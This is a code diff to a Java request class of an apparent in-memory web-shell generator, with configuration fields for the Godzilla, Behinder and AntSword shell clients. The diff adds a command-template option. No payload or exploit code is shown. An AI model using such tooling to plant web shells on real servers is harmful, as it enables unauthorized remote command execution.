@@ -23,6 +23,7 @@ public class MemShellGenerateRequest {
         private String godzillaPass;
         private String godzillaKey;
         private String commandParamName;
+        private String commandTemplate;
         private String behinderPass;
         private String antSwordPass;
         private String headerName;
@@ -50,6 +51,7 @@ public class MemShellGenerateRequest {
             case Command -> CommandConfig.builder()
                     .shellClassName(shellToolConfig.getShellClassName())
                     .paramName(shellToolConfig.getCommandParamName())
+                    .template(shellToolConfig.getCommandTemplate())
                     .encryptor(CommandConfig.Encryptor.fromString(shellToolConfig.getEncryptor()))
                     .implementationClass(CommandConfig.ImplementationClass.fromString(shellToolConfig.getImplementationClass()))
                     .build();
